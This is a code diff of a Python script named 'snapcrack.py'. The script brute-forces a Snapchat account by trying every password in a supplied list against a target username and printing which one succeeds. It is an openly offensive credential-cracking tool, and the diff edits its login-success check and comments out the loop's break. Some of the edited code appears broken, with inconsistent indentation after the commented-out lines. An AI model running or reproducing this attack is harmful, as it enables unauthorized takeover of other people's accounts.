@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-from pysnap import Snapchat
+from pysnap import *
 import sys
 import os
 
@@ -12,6 +12,7 @@ try:
     targetpasslist = sys.argv[2]
 except:
     print("Syntax: snapcrack.py username /path/to/passlist.txt")
+
 
 os.system("clear")
 print("  ██████  ███▄    █  ▄▄▄       ██▓███   ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀   ")
@@ -35,9 +36,15 @@ def main():
 	passwords = open(targetpasslist,"r")
 
 	for targetpassword in passwords:
-		if s.login(targetusername, targetpassword)['updates_response'].get('logged'):
+		# if s.login(targetusername, targetpassword)[b'updates_response'].get('logged'):
+		can_login = s.login(targetusername, targetpassword)
+			
+		is_logged = can_login.find(b"logged")
+		if is_logged > 0:
+
+		# break
 			print("[░]success: username: " + targetusername + "\t password: " + targetpassword)
-			break
+		# 	# break
 		else:
 			print(f"[░] {targetpassword} FAIL")
 
